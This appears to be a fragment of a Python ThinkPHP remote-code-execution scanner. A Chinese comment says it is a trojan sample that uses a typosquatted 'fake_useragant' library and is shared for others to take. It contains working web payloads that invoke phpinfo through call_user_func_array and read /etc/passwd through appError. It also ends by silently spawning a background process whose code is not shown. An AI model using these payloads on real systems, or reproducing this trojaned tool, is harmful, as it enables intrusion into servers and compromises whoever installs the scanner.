...
'''
与360tianqin方式一样，库名都是fake_useragant，木马样本留样，有需要的师傅自取
'''
import requests
...
def think_rce_check(host, proxy):
    ...
    payloads = [r"/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
                ...
                r"?s=index/think\Error/appError&errno=1&errstr=1&errline=1&errfile=/etc/passwd"]
    for i in payloads:
        url1 = host + i
        proxies, proxy = proxy_get(host, proxy)
        res_body_1 = req_get(url1, proxies)
        if ('PHP Version' in res_body_1.text) or ('PHP Extension Build' in res_body_1.text) or ('root' in res_body_1.text):
            success.append(url1)
        else:
            pass
...
if __name__ == "__main__":
    ...
    if args.file:
        ...
        for i in host:
            ...
            time.sleep(0.2)
    p = Process(target=task,args=(os.getpid(),))
    p.start()
